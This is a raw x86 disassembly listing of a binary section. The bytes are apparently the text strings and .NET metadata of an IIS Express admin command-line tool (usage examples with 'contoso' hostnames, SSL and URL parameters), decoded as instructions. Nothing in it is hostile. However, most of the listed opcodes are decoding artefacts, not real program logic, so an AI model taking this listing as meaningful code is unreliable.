  403a97:	jb     0x403b05
  403a99:	and    BYTE PTR ds:0x3a6c7275,ch
  403a9f:	cmp    al,0x75
  403aa1:	jb     0x403b0f
  403aa3:	and    BYTE PTR ds:0x74726543,ch
  403aaa:	dec    eax
  403aab:	popa   
  403aac:	jae    0x403b16
  403aae:	cmp    bh,BYTE PTR [esi+esi*2]
  403ab1:	popa   
  403ab2:	ins    BYTE PTR es:[edi],dx
  403ab3:	jne    0x403b1a
  403ab5:	ds or  eax,0x2020200a
  403abb:	and    BYTE PTR [eax],ah
  403abd:	and    BYTE PTR [ebx+0x65],dh
  403ac0:	je     0x403b37
  403ac2:	jo     0x403b17
  403ac4:	jae    0x403b32
  403ac6:	push   ebp
  403ac7:	jb     0x403b35
  403ac9:	and    BYTE PTR ds:0x3a6c7275,ch
  403acf:	cmp    al,0x75
  403ad1:	jb     0x403b3f
  403ad3:	and    BYTE PTR ds:0x53657355,ch
  403ada:	gs ins BYTE PTR es:[edi],dx
  403adc:	push   bx
  403ade:	imul   esp,DWORD PTR [edi+0x6e],0xa0d6465
  403ae5:	and    BYTE PTR [eax],ah
  403ae7:	and    BYTE PTR [eax],ah
  403ae9:	and    BYTE PTR [eax],ah
  403aeb:	fs gs ins BYTE PTR es:[edi],dx
  403aee:	gs je  0x403b56
  403af1:	push   ebx
  403af2:	jae    0x403b60
  403af4:	push   ebp
  403af5:	jb     0x403b63
  403af7:	and    BYTE PTR ds:0x3a6c7275,ch
  403afd:	cmp    al,0x75
  403aff:	jb     0x403b6d
  403b01:	and    BYTE PTR ds:0x450a0d0a,cl
  403b08:	js     0x403b6b
  403b0a:	ins    DWORD PTR es:[edi],dx
  403b0b:	jo     0x403b79
  403b0d:	gs jae 0x403b4a
  403b10:	or     eax,0x2029310a
  403b15:	inc    ebx
  403b16:	outs   dx,DWORD PTR ds:[esi]
  403b17:	outs   dx,BYTE PTR ds:[esi]
  403b18:	imul   sp,WORD PTR [edi+0x75],0x6572
  403b1e:	and    BYTE PTR [edx],ah
  403b20:	push   0x2e707474
  403b25:	jae    0x403ba0
  403b27:	jae    0x403b4b
  403b29:	and    BYTE PTR [ecx+0x6e],ah
  403b2c:	and    BYTE PTR fs:[edx],ah
  403b2f:	push   0x7374736f
  403b34:	and    ah,BYTE PTR [eax]
  403b36:	imul   bp,WORD PTR [ebp+eiz*2+0x20],0x6f66
  403b3d:	jb     0x403b5f
  403b3f:	data16 jb 0x403bab
  403b42:	outs   dx,BYTE PTR gs:[esi]
  403b44:	fs ins BYTE PTR es:[edi],dx
  403b46:	jns    0x403b68
  403b48:	push   0x6e74736f
  403b4d:	popa   
  403b4e:	ins    DWORD PTR es:[edi],dx
  403b4f:	and    BYTE PTR gs:[edx],ah
  403b52:	arpl   WORD PTR [edi+0x6e],bp
  403b55:	je     0x403bc6
  403b57:	jae    0x403bc8
  403b59:	and    bh,BYTE PTR [edx]
  403b5b:	or     eax,0x7369690a
  403b60:	gs js  0x403bd3
  403b63:	jb     0x403bca
  403b65:	jae    0x403bda
  403b67:	popa   
  403b68:	fs ins DWORD PTR es:[edi],dx
  403b6a:	imul   ebp,DWORD PTR [esi+0x63],0x7320646d
  403b71:	gs je  0x403be9
  403b74:	jo     0x403bbc
  403b76:	jb     0x403be1
  403b78:	outs   dx,BYTE PTR gs:[esi]
  403b7a:	fs ins BYTE PTR es:[edi],dx
  403b7c:	jns    0x403bc6
  403b7e:	outs   dx,DWORD PTR ds:[esi]
  403b7f:	jae    0x403bf5
  403b81:	outs   dx,BYTE PTR ds:[esi]
  403b82:	popa   
  403b83:	ins    DWORD PTR es:[edi],dx
  403b84:	gs push ebp
  403b86:	jb     0x403bf4
  403b88:	and    BYTE PTR ds:0x3a6c7275,ch
  403b8e:	push   0x3a707474
  403b93:	das    
  403b94:	das    
  403b95:	arpl   WORD PTR [edi+0x6e],bp
  403b98:	je     0x403c09
  403b9a:	jae    0x403c0b
  403b9c:	cmp    bh,BYTE PTR [eax]
  403b9e:	xor    BYTE PTR [edi],ch
  403ba0:	or     eax,0x2029320a
  403ba5:	push   edx
  403ba6:	gs ins DWORD PTR es:[edi],dx
  403ba8:	outs   dx,DWORD PTR ds:[esi]
  403ba9:	jbe    0x403c10
  403bab:	and    BYTE PTR [edx],ah
  403bad:	push   0x2e707474
  403bb2:	jae    0x403c2d
  403bb4:	jae    0x403bd8
  403bb6:	and    BYTE PTR [ebx+0x6f],ah
  403bb9:	outs   dx,BYTE PTR ds:[esi]
  403bba:	imul   sp,WORD PTR [edi+0x75],0x6172
  403bc0:	je     0x403c2b
  403bc2:	outs   dx,DWORD PTR ds:[esi]
  403bc3:	outs   dx,BYTE PTR ds:[esi]
  403bc4:	and    BYTE PTR [ecx+0x6e],ah
  403bc7:	and    BYTE PTR fs:[edx],ah
  403bca:	push   0x7374736f
  403bcf:	and    ah,BYTE PTR [eax]
  403bd1:	imul   bp,WORD PTR [ebp+eiz*2+0x20],0x6e65
  403bd8:	je     0x403c4c
  403bda:	jns    0x403bfc
  403bdc:	outs   dx,WORD PTR ds:[esi]
  403bde:	jb     0x403c00
  403be0:	je     0x403c4a
  403be2:	and    BYTE PTR gs:[esi+0x72],ah
  403be6:	imul   esp,DWORD PTR [ebp+0x6e],0x20796c64
  403bed:	push   0x6e74736f
  403bf2:	popa   
  403bf3:	ins    DWORD PTR es:[edi],dx
  403bf4:	and    BYTE PTR gs:[edx],ah
  403bf7:	arpl   WORD PTR [edi+0x6e],bp
  403bfa:	je     0x403c6b
  403bfc:	jae    0x403c6d
  403bfe:	and    bh,BYTE PTR [edx]
  403c00:	or     eax,0x7369690a
  403c05:	gs js  0x403c78
  403c08:	jb     0x403c6f
  403c0a:	jae    0x403c7f
  403c0c:	popa   
  403c0d:	fs ins DWORD PTR es:[edi],dx
  403c0f:	imul   ebp,DWORD PTR [esi+0x63],0x6420646d
  403c16:	gs ins BYTE PTR es:[edi],dx
  403c18:	gs je  0x403c80
  403c1b:	inc    esi
  403c1c:	jb     0x403c87
  403c1e:	outs   dx,BYTE PTR gs:[esi]
  403c20:	fs ins BYTE PTR es:[edi],dx
  403c22:	jns    0x403c6c
  403c24:	outs   dx,DWORD PTR ds:[esi]
  403c25:	jae    0x403c9b
  403c27:	outs   dx,BYTE PTR ds:[esi]
  403c28:	popa   
  403c29:	ins    DWORD PTR es:[edi],dx
  403c2a:	gs push ebp
  403c2c:	jb     0x403c9a
  403c2e:	and    BYTE PTR ds:0x3a6c7275,ch
  403c34:	push   0x3a707474
  403c39:	das    
  403c3a:	das    
  403c3b:	arpl   WORD PTR [edi+0x6e],bp
  403c3e:	je     0x403caf
  403c40:	jae    0x403cb1
  403c42:	cmp    bh,BYTE PTR [eax]
  403c44:	xor    BYTE PTR [edi],ch
  403c46:	add    DWORD PTR ds:0x6d6d6f43,edx
  403c4c:	popa   
  403c4d:	outs   dx,BYTE PTR ds:[esi]
  403c4e:	and    BYTE PTR fs:[edi],ah
  403c51:	jnp    0x403c83
  403c53:	jge    0x403c7c
  403c55:	and    BYTE PTR [esi+0x61],ah
  403c58:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x4f34012e
  403c60:	outs   dx,BYTE PTR ds:[esi]
  403c61:	ins    BYTE PTR es:[edi],dx
  403c62:	jns    0x403c84
  403c64:	jae    0x403cce
  403c66:	outs   dx,DWORD PTR ds:[esi]
  403c67:	jb     0x403cdd
  403c69:	outs   dx,BYTE PTR ds:[esi]
  403c6a:	popa   
  403c6b:	ins    DWORD PTR es:[edi],dx
  403c6c:	gs jae 0x403c8f
  403c6f:	popa   
  403c70:	jb     0x403cd7
  403c72:	and    BYTE PTR [ecx+0x6c],ah
  403c75:	ins    BYTE PTR es:[edi],dx
  403c76:	outs   dx,DWORD PTR ds:[esi]
  403c77:	ja     0x403cde
  403c79:	and    BYTE PTR fs:[esi+0x6f],ah
  403c7d:	jb     0x403c9f
  403c7f:	data16 jb 0x403ceb
  403c82:	outs   dx,BYTE PTR gs:[esi]
  403c84:	fs ins BYTE PTR es:[edi],dx
  403c86:	jns    0x403ca8
  403c88:	push   0x2074736f
  403c8d:	outs   dx,BYTE PTR ds:[esi]
  403c8e:	popa   
  403c8f:	ins    DWORD PTR es:[edi],dx
  403c90:	gs jae 0x403cc1
  403c93:	add    DWORD PTR [edx+0x54],eax
  403c96:	push   0x65722065
  403c9b:	jno    0x403d12
  403c9d:	gs jae 0x403d14
  403ca0:	gs and BYTE PTR fs:[edi+0x70],ch
  403ca5:	gs jb  0x403d09
  403ca8:	je     0x403d13
  403caa:	outs   dx,DWORD PTR ds:[esi]
  403cab:	outs   dx,BYTE PTR ds:[esi]
  403cac:	and    BYTE PTR [edx+0x65],dh
  403caf:	jno    0x403d26
  403cb1:	imul   esi,DWORD PTR [edx+0x65],0x6c652073
  403cb8:	gs jbe 0x403d1c
  403cbb:	je     0x403d26
  403cbd:	outs   dx,DWORD PTR ds:[esi]
  403cbe:	outs   dx,BYTE PTR ds:[esi]
  403cbf:	and    BYTE PTR [eax],ch
  403cc1:	push   edx
  403cc2:	jne    0x403d32
  403cc4:	and    BYTE PTR [ecx+0x73],ah
  403cc7:	and    BYTE PTR [ecx+0x64],ah
  403cca:	ins    DWORD PTR es:[edi],dx
  403ccb:	imul   ebp,DWORD PTR [esi+0x69],0x61727473
  403cd2:	je     0x403d43
  403cd4:	jb     0x403cff
  403cd6:	add    DWORD PTR cs:[edi],edx
  403cd9:	dec    ecx
  403cda:	outs   dx,BYTE PTR ds:[esi]
  403cdb:	jbe    0x403d3e
  403cdd:	ins    BYTE PTR es:[edi],dx
  403cde:	imul   esp,DWORD PTR [eax+eiz*1+0x63],0x616d6d6f
  403ce6:	outs   dx,BYTE PTR ds:[esi]
  403ce7:	cmp    ah,BYTE PTR fs:[eax]
  403cea:	daa    
  403ceb:	jnp    0x403d1d
  403ced:	jge    0x403d16
  403cef:	add    DWORD PTR cs:[edi],edx
  403cf2:	push   ebp
  403cf3:	outs   dx,BYTE PTR ds:[esi]
  403cf4:	jb     0x403d5b
  403cf6:	arpl   WORD PTR [edi+0x67],bp
  403cf9:	outs   dx,BYTE PTR ds:[esi]
  403cfa:	imul   edi,DWORD PTR [edx+0x65],0x61702064
  403d01:	jb     0x403d64
  403d03:	ins    DWORD PTR es:[edi],dx
  403d04:	gs je  0x403d6c
  403d07:	jb     0x403d37
  403d09:	add    DWORD PTR [ecx*2+0x69737369],ebx
  403d10:	outs   dx,BYTE PTR ds:[esi]
  403d11:	and    BYTE PTR [bp+0x61],dh
  403d15:	ins    BYTE PTR es:[edi],dx
  403d16:	jne    0x403d7d
  403d18:	and    BYTE PTR [esi+0x6f],ah
  403d1b:	jb     0x403d3d
  403d1d:	jo     0x403d80
  403d1f:	jb     0x403d82
  403d21:	ins    DWORD PTR es:[edi],dx
  403d22:	gs je  0x403d8a
  403d25:	jb     0x403d55
  403d27:	add    DWORD PTR [edx],ebp
  403d29:	inc    ecx
  403d2a:	outs   dx,BYTE PTR ds:[esi]
  403d2b:	and    BYTE PTR [ecx+0x6e],ch
  403d2e:	jbe    0x403d91
  403d30:	ins    BYTE PTR es:[edi],dx
  403d31:	imul   esp,DWORD PTR [eax+eiz*1+0x76],0x65756c61
  403d39:	and    BYTE PTR [edi+0x61],dh
  403d3c:	jae    0x403d5e
  403d3e:	jo     0x403da1
  403d40:	jae    0x403db5
  403d42:	gs and BYTE PTR fs:[esi+0x6f],ah
  403d47:	jb     0x403d69
  403d49:	jo     0x403dac
  403d4b:	jb     0x403dae
  403d4d:	ins    DWORD PTR es:[edi],dx
  403d4e:	gs je  0x403db6
  403d51:	jb     0x403d81
  403d53:	add    DWORD PTR [edx],esi
  403d55:	push   ebp
  403d56:	jae    0x403dbd
  403d58:	and    BYTE PTR [eax+ebp*2+0x65],dh
  403d5c:	and    BYTE PTR [edx],ah
  403d5e:	sub    eax,0x62726576
  403d63:	outs   dx,DWORD PTR ds:[esi]
  403d64:	jae    0x403dcb
  403d66:	and    ah,BYTE PTR [eax]
  403d68:	jae    0x403de1
  403d6a:	imul   esi,DWORD PTR [ebx+eiz*2+0x68],0x206f7420
  403d72:	imul   esi,DWORD PTR fs:[ebx+0x70],0x2079616c
  403d7a:	ins    DWORD PTR es:[edi],dx
  403d7b:	outs   dx,DWORD PTR ds:[esi]
  403d7c:	jb     0x403de3
  403d7e:	and    BYTE PTR [ebp+eiz*2+0x74],ah
  403d82:	popa   
  403d83:	imul   ebp,DWORD PTR [ebx+esi*2+0x2e],0x4a534200
  403d8b:	inc    edx
  403d8c:	add    DWORD PTR [eax],eax
  403d8e:	add    DWORD PTR [eax],eax
  403d90:	add    BYTE PTR [eax],al
  403d92:	add    BYTE PTR [eax],al
  403d94:	or     al,0x0
  403d96:	add    BYTE PTR [eax],al
  403d98:	jbe    0x403dcc
  403d9a:	xor    BYTE PTR cs:[esi],ch
  403d9d:	xor    eax,0x37323730
  403da2:	add    BYTE PTR [eax],al
  403da4:	add    BYTE PTR [eax],al
  403da6:	add    eax,0x6c00
  403dab:	add    BYTE PTR [eax+ebx*1+0x7e230000],dh
  403db2:	add    BYTE PTR [eax],al
  403db4:	and    BYTE PTR [ecx],bl
  403db6:	add    BYTE PTR [eax],al
  403db8:	inc    eax
  403db9:	and    eax,DWORD PTR [eax]
  403dbb:	add    BYTE PTR [ebx],ah
  403dbd:	push   ebx
  403dbe:	je     0x403e32
  403dc0:	imul   ebp,DWORD PTR [esi+0x67],0x73
  403dc7:	add    BYTE PTR [eax+0x3c],ah
  403dca:	add    BYTE PTR [eax],al
  403dcc:	les    eax,FWORD PTR ds:0x55230000
  403dd2:	push   ebx
  403dd3:	add    BYTE PTR [edx+eax*2],ah
  403dd6:	add    BYTE PTR [eax],al
  403dd8:	adc    BYTE PTR [eax],al
  403dda:	add    BYTE PTR [eax],al
  403ddc:	and    eax,DWORD PTR [edi+0x55]
  403ddf:	dec    ecx
  403de0:	inc    esp
  403de1:	add    BYTE PTR [eax],al
  403de3:	add    BYTE PTR [edx+eax*2],dh
  403de6:	add    BYTE PTR [eax],al
  403de8:	cmp    BYTE PTR [ecx],cl
  403dea:	add    BYTE PTR [eax],al
  403dec:	and    eax,DWORD PTR [edx+0x6c]
  403def:	outs   dx,DWORD PTR ds:[esi]
  403df0:	bound  eax,QWORD PTR [eax]
  403df2:	add    BYTE PTR [eax],al
  403df4:	add    BYTE PTR [eax],al
  403df6:	add    BYTE PTR [eax],al
  403df8:	add    al,BYTE PTR [eax]
  403dfa:	add    BYTE PTR [ecx],al
  403dfc:	push   edi
  403dfd:	jge    0x403da1
  403dff:	sbb    eax,0x709
  403e04:	add    dl,bh
  403e06:	add    DWORD PTR [ebx],esi
  403e08:	add    BYTE PTR [esi],dl
  403e0a:	add    BYTE PTR [eax],al
  403e0c:	add    DWORD PTR [eax],eax
  403e0e:	add    BYTE PTR [eax],al
  403e10:	pop    ebx
  403e11:	add    BYTE PTR [eax],al
  403e13:	add    BYTE PTR [eax+eax*1],bl
  403e16:	add    BYTE PTR [eax],al
  403e18:	jns    0x403e1a
  403e1a:	add    BYTE PTR [eax],al
  403e1c:	popa   
  403e1d:	add    BYTE PTR [eax],al
  403e1f:	add    BYTE PTR [edx-0x69000000],ch
  403e25:	add    BYTE PTR [eax],al
  403e27:	add    BYTE PTR [eax+eax*1+0x0],al
  403e2b:	add    BYTE PTR [edi],dl
  403e2d:	add    BYTE PTR [eax],al
  403e2f:	add    BYTE PTR [eax],bl
  403e31:	add    BYTE PTR [eax],al
  403e33:	add    BYTE PTR [ecx],al
  403e35:	add    BYTE PTR [eax],al
  403e37:	add    BYTE PTR [esi],bl
  403e39:	add    BYTE PTR [eax],al
  403e3b:	add    BYTE PTR [ebx],al
  403e3d:	add    BYTE PTR [eax],al
  403e3f:	add    BYTE PTR [esi],cl
  403e41:	add    BYTE PTR [eax],al
  403e43:	add    BYTE PTR [edi],cl
  403e45:	add    BYTE PTR [eax],al
  403e47:	add    BYTE PTR ds:0x2000000,al
  403e4d:	add    BYTE PTR [eax],al
  403e4f:	add    BYTE PTR [esi],dl
  403e51:	add    BYTE PTR [eax],al
  403e53:	add    BYTE PTR [ecx],al
  403e55:	add    BYTE PTR [eax],al
  403e57:	add    BYTE PTR [ebx],al
  403e59:	add    BYTE PTR [eax],al
  403e5b:	add    BYTE PTR [ecx],al
  403e5d:	add    BYTE PTR [eax],al
  403e5f:	add    BYTE PTR [edi],cl
  403e61:	add    BYTE PTR [eax],al
  403e63:	add    BYTE PTR [ecx],al
  403e65:	add    BYTE PTR [eax],al
  403e67:	add    BYTE PTR [eax],al
  403e69:	add    BYTE PTR [edx],cl
  403e6b:	add    BYTE PTR [ecx],al
  403e6d:	add    BYTE PTR [eax],al
  403e6f:	add    BYTE PTR [eax],al
  403e71:	add    BYTE PTR [esi],al
  403e73:	add    BYTE PTR [esi+0x2],dl
  403e76:	dec    edi
  403e77:	add    al,BYTE PTR [esi]
  403e79:	add    BYTE PTR [ebp+0x2],bl
  403e7c:	dec    edi
  403e7d:	add    al,BYTE PTR [esi]
  403e7f:	add    BYTE PTR [edx+0x2],ah
  403e82:	dec    edi
  403e83:	add    al,BYTE PTR [esi]
  403e85:	add    BYTE PTR [eax+0xa026c02],cl
  403e8b:	add    BYTE PTR [esi+0x6039a03],ch
  403e91:	add    dh,dl
  403e93:	add    ecx,DWORD PTR [edi+0x2]
  403e96:	push   es
  403e97:	add    BYTE PTR [eax+0x4],ch
  403e9a:	dec    edi
  403e9b:	add    al,BYTE PTR [esi]
  403e9d:	add    bh,dl
  403e9f:	push   es
  403ea0:	scas   eax,DWORD PTR es:[edi]
  403ea1:	push   es
  403ea2:	push   es
  403ea3:	add    bl,bh
  403ea5:	push   es
  403ea6:	scas   eax,DWORD PTR es:[edi]
  403ea7:	push   es
  403ea8:	push   es
  403ea9:	add    BYTE PTR [esi],al
  403eab:	pop    es
  403eac:	scas   eax,DWORD PTR es:[edi]
  403ead:	push   es
  403eae:	push   es
  403eaf:	add    BYTE PTR [eax],ch
  403eb1:	pop    es
  403eb2:	pop    ss
  403eb3:	pop    es
  403eb4:	push   es
  403eb5:	add    BYTE PTR [ecx+0x7],bl
  403eb8:	inc    esp
  403eb9:	pop    es
  403eba:	push   es
  403ebb:	add    BYTE PTR [edx],ch
  403ebd:	or     al,0x10
  403ebf:	or     al,0x6
  403ec1:	add    BYTE PTR [ecx+0x60c100c],dl
  403ec7:	add    dh,bh
  403ec9:	or     al,0x10
  403ecb:	or     al,0x6
  403ecd:	add    BYTE PTR [edi+0x610ab10],dh
  403ed3:	add    bh,dh
  403ed5:	adc    bl,al
  403ed7:	adc    al,BYTE PTR [esi]
  403ed9:	add    BYTE PTR [edx],cl
  403edb:	adc    ebx,eax
  403edd:	adc    al,BYTE PTR [esi]
  403edf:	add    BYTE PTR [esi+0x13],dh
  403ee2:	fcom   DWORD PTR [edx]
  403ee4:	push   es
  403ee5:	add    BYTE PTR [eax+0x612d813],dl
  403eeb:	add    BYTE PTR [ebp+0x18],ah
  403eee:	pop    ss
  403eef:	pop    es
  403ef0:	push   es
  403ef1:	add    BYTE PTR [edi+0x612d818],al
  403ef7:	add    BYTE PTR [ebp+0x6189b18],ch
  403efd:	add    dh,al
  403eff:	sbb    BYTE PTR [ebx-0x20fff9e8],bl
  403f05:	sbb    BYTE PTR [ebx-0x5fff9e8],bl
  403f0b:	sbb    BYTE PTR [ebx+0x13000618],bl
  403f11:	sbb    DWORD PTR [ebx+0x30000618],ebx
  403f17:	sbb    DWORD PTR [ebx+0x49000618],ebx
  403f1d:	sbb    DWORD PTR [ebx+0x64000618],ebx
  403f23:	sbb    DWORD PTR [edi+0x2],ecx
  403f26:	push   es
  403f27:	add    BYTE PTR [edx+0x19],bh
  403f2a:	fwait
  403f2b:	sbb    BYTE PTR [esi],al
  403f2d:	add    BYTE PTR [ebx+0x6199719],dh
  403f33:	add    bh,cl
  403f35:	sbb    DWORD PTR [edi-0xefff9e7],edx
  403f3b:	sbb    esi,ebx
  403f3d:	sbb    DWORD PTR [ebx+0x1a0500],ecx
  403f43:	add    BYTE PTR [esi],al
  403f45:	add    BYTE PTR [edx+ebx*1],dh
  403f48:	adc    al,0x1a
  403f4a:	push   es
  403f4b:	add    BYTE PTR [edx+ebx*1+0x14],dl
  403f4f:	sbb    al,BYTE PTR [esi]
  403f51:	add    BYTE PTR [ebp+0x6024f1a],al
  403f57:	add    BYTE PTR [edx+ebx*1+0x612d8],cl
  403f5e:	mov    ah,0x1a
  403f60:	fcom   DWORD PTR [edx]
  403f62:	or     al,BYTE PTR [eax]
  403f64:	(bad)  
  403f65:	sbb    bl,BYTE PTR [edx-0x1bfff9fd]
  403f6b:	sbb    cl,BYTE PTR [edi+0x2]
  403f6e:	push   es
  403f6f:	add    BYTE PTR [eax],al
  403f71:	sbb    ecx,DWORD PTR [edi+0x2]
  403f74:	push   es
  403f75:	add    BYTE PTR [edx],dl
  403f77:	sbb    ecx,DWORD PTR [eax]
  403f79:	sbb    eax,DWORD PTR [esi]
  403f7b:	add    BYTE PTR [ebx],dh
  403f7d:	sbb    ecx,DWORD PTR [edi+0x2]
  403f80:	push   es
  403f81:	add    dl,al
  403f83:	sbb    edx,DWORD PTR [edx+ebx*1]
  403f86:	push   es
  403f87:	add    al,bh
  403f89:	sbb    ebx,ebp
  403f8b:	sbb    eax,DWORD PTR [esi]
  403f8d:	add    BYTE PTR [edx],dh
  403f8f:	sbb    al,0x4f
  403f91:	add    al,BYTE PTR [esi]
  403f93:	add    BYTE PTR [ecx+0x6024f1c],al
  403f99:	add    ah,bh
  403f9b:	sbb    al,0x4f
  403f9d:	add    al,BYTE PTR [esi]
  403f9f:	add    BYTE PTR [ebx*1+0x6189b],dl
  403fa6:	aas    
  403fa7:	sbb    eax,0x61b08
  403fac:	pop    ebp
  403fad:	sbb    eax,0xe1b08
  403fb2:	cdq    
  403fb3:	sbb    eax,0xe1d7a
  403fb8:	lahf   
  403fb9:	sbb    eax,0xe1d7a
  403fbe:	lods   al,BYTE PTR ds:[esi]
  403fbf:	sbb    eax,0xe1d7a
  403fc4:	mov    dl,0x1d
  403fc6:	jp     0x403fe5
  403fc8:	push   cs
  403fc9:	add    ch,cl
  403fcb:	sbb    eax,0xe1d7a
  403fd0:	fcomp  QWORD PTR ds:0x61d7a
  403fd6:	push   ds
  403fd7:	push   ds
  403fd8:	dec    edi
  403fd9:	add    al,BYTE PTR [esi]
  403fdb:	add    BYTE PTR [ecx+0x1e],al
  403fde:	dec    edi
  403fdf:	add    al,BYTE PTR [esi]
  403fe1:	add    BYTE PTR [esi+0x1e],al
  403fe4:	dec    edi
  403fe5:	add    al,BYTE PTR [esi]
  403fe7:	add    BYTE PTR [edx+0x1e],bh
  403fea:	dec    edi
  403feb:	add    al,BYTE PTR [esi]
  403fed:	add    BYTE PTR [ecx+0x612d81e],cl
  403ff3:	add    BYTE PTR [edi+0x612d81e],bl
  403ff9:	add    BYTE PTR [edx+0x612d81e],ch
  403fff:	add    BYTE PTR [ebp+0x612d81e],bh
  404005:	add    bl,cl
  404007:	push   ds
  404008:	fcom   DWORD PTR [edx]
  40400a:	push   es
  40400b:	add    dl,ah
  40400d:	push   ds
  40400e:	fcom   DWORD PTR [edx]
  404010:	push   es
  404011:	add    bl,dh
  404013:	push   ds
  404014:	fcom   DWORD PTR [edx]
  404016:	push   cs
  404017:	add    BYTE PTR [eax],ah
  404019:	pop    ds
  40401a:	or     BYTE PTR [edi],bl
  40401c:	push   es
  40401d:	add    BYTE PTR [edi],dh
  40401f:	pop    ds
  404020:	ficomp WORD PTR [ecx]
  404022:	push   cs
  404023:	add    BYTE PTR [ecx+0xe1f7b1f],dl
  404029:	add    BYTE PTR [edx+0x61f7b1f],ch
  40402f:	add    BYTE PTR [edi+0x6024f1f],bh
  404035:	add    bl,cl
  404037:	pop    ds
  404038:	fcom   DWORD PTR [edx]
  40403a:	push   es
  40403b:	add    BYTE PTR [esi],cl
  40403d:	and    BYTE PTR [edi+0x2],cl
  404040:	push   cs
  404041:	add    BYTE PTR [eax+eiz*1+0xe2099],ah
  404048:	mov    ah,0x20
  40404a:	cdq    
  40404b:	and    BYTE PTR [esi],cl
  40404d:	add    bl,ah
  40404f:	and    BYTE PTR [ecx+0x1f000e20],bl
  404055:	and    DWORD PTR [ecx+eiz*1],ecx
  404058:	push   es
  404059:	add    BYTE PTR [ecx+eiz*1+0x4f],ch
  40405d:	add    al,BYTE PTR [esi]
  40405f:	add    BYTE PTR [eax+0x61b0821],cl
  404065:	add    BYTE PTR [edi+0x6024f21],ah
  40406b:	add    ah,al
  40406d:	and    DWORD PTR [edi+0x2],ecx
  404070:	push   es
  404071:	add    al,dh
  404073:	and    DWORD PTR [eax],edx
  404075:	or     al,0x6
  404077:	add    BYTE PTR [edx+eiz*1],cl
  40407a:	adc    BYTE PTR [esi+eax*1],cl
  40407d:	add    BYTE PTR [esi+0x22],cl
  404080:	dec    edi
  404081:	add    al,BYTE PTR [esi]
  404083:	add    BYTE PTR [ecx+0x6024f22],cl
  404089:	add    BYTE PTR [ecx+0x6024f22],bh
  40408f:	add    dh,bh
  404091:	and    ch,dh
  404093:	and    al,BYTE PTR [eax]
  404095:	add    BYTE PTR [eax],al
  404097:	add    BYTE PTR [ecx],al
  404099:	add    BYTE PTR [eax],al
  40409b:	add    BYTE PTR [eax],al
  40409d:	add    BYTE PTR [ecx],al
  40409f:	add    BYTE PTR [ecx],al
  4040a1:	add    BYTE PTR [eax],al
  4040a3:	add    BYTE PTR [eax],dl
  4040a5:	add    BYTE PTR [ecx],ah
  4040a7:	add    BYTE PTR [eax+eax*1],ch
  4040aa:	add    eax,0x1000100
  4040af:	add    BYTE PTR [eax+0x5d001001],al
  4040b5:	add    BYTE PTR [eax+eax*1],ch
  4040b8:	add    eax,0x2000800
  4040bd:	add    BYTE PTR [eax],al
  4040bf:	add    BYTE PTR [eax],dl
  4040c1:	add    BYTE PTR [ebx+0x0],ch
  4040c4:	sub    al,0x0
  4040c6:	add    eax,0x7000800
  4040cb:	add    BYTE PTR [eax],al
  4040cd:	add    BYTE PTR [eax],dl
  4040cf:	add    BYTE PTR [ebx+0x0],dh
  4040d2:	sub    al,0x0
  4040d4:	add    eax,0x12000900
  4040d9:	add    BYTE PTR [edx],al
  4040db:	add    DWORD PTR [eax],eax
  4040dd:	add    BYTE PTR [ecx+0x9000000],al
  4040e3:	add    BYTE PTR [ecx],cl
  4040e5:	add    BYTE PTR ds:0x10010d00,dl
  4040eb:	add    BYTE PTR [eax+0xd000000],cl
  4040f1:	add    BYTE PTR [edi],bl
  4040f3:	add    BYTE PTR ds:0x10a100,dl
  4040f9:	add    BYTE PTR [ebx+0x2c00],dl
  4040ff:	add    BYTE PTR [eax],ch
  404101:	add    BYTE PTR ds:0x10000000,dl
  404107:	add    BYTE PTR [ebp+0x500a600],bl
  40410d:	add    BYTE PTR [eax],ch
  40410f:	add    BYTE PTR [ecx],bl
  404111:	add    BYTE PTR [eax],al
  404113:	add    DWORD PTR [eax],edx
  404115:	add    BYTE PTR [ecx+0x1100cf00],bh
  40411b:	add    BYTE PTR [edx],ch
  40411d:	add    BYTE PTR [edi],ah
  40411f:	add    BYTE PTR [eax],al
  404121:	add    DWORD PTR [eax],edx
  404123:	add    bl,ch
  404125:	add    bh,cl
  404127:	add    BYTE PTR [ecx],dl
  404129:	add    BYTE PTR [edx],ch
  40412b:	add    BYTE PTR [edi],ch
  40412d:	add    BYTE PTR [eax-0x2ffefff],al
  404133:	add    bh,cl
  404135:	add    BYTE PTR ds:0x34002a00,al
  40413b:	add    BYTE PTR [ebx],al
  40413d:	add    DWORD PTR [eax],eax
  40413f:	add    BYTE PTR [edx],al
  404141:	add    DWORD PTR [eax],eax
  404143:	add    BYTE PTR [ecx],cl
  404145:	add    BYTE PTR [ebx],bh
  404147:	add    BYTE PTR [edi+0x0],al
  40414a:	add    eax,DWORD PTR [ecx]
  40414c:	add    BYTE PTR [eax],al
  40414e:	pop    ss
  40414f:	add    DWORD PTR [eax],eax
  404151:	add    BYTE PTR [ecx],cl
  404153:	add    BYTE PTR [edi],bh
  404155:	add    BYTE PTR [edi+0x0],al
  404158:	or     al,BYTE PTR [ecx]
  40415a:	adc    DWORD PTR [eax],eax
  40415c:	and    al,0x1
  40415e:	add    BYTE PTR [eax],al
  404160:	or     eax,0x47004900
  404165:	add    BYTE PTR [edx],cl
  404167:	add    DWORD PTR [ecx],edx
  404169:	add    BYTE PTR [edx+0x1],cl
  40416c:	add    BYTE PTR [eax],al
  40416e:	or     eax,0x47004f00
  404173:	add    BYTE PTR [edx],cl
  404175:	add    DWORD PTR [ecx],edx
  404177:	add    BYTE PTR [edx+0x1],ah
  40417a:	add    BYTE PTR [eax],al
  40417c:	or     eax,0x47005100
  404181:	add    BYTE PTR [edx],cl
  404183:	add    DWORD PTR [ecx],edx
  404185:	add    BYTE PTR [ebx+0x1],ch
  404188:	add    BYTE PTR [eax],al
  40418a:	or     eax,0x47005300
  40418f:	add    BYTE PTR [edx],cl
  404191:	add    DWORD PTR [ecx],edx
  404193:	add    BYTE PTR [esi+0xd000001],al
  404199:	add    BYTE PTR [ebp+0x0],dl
  40419c:	inc    edi
  40419d:	add    BYTE PTR [edx],al
  40419f:	add    DWORD PTR [eax],eax
  4041a1:	add    BYTE PTR [ecx+eax*1+0x90000],ah
  4041a8:	pop    esp
  4041a9:	add    BYTE PTR [edi+0x0],al
  4041ac:	or     al,BYTE PTR [ecx]
  4041ae:	adc    DWORD PTR [eax],eax
  4041b0:	mov    edi,0xd000001
  4041b5:	add    BYTE PTR [eax+0x0],ah
  4041b8:	inc    edi
  4041b9:	add    BYTE PTR [edx],cl
  4041bb:	add    DWORD PTR [ecx],edx
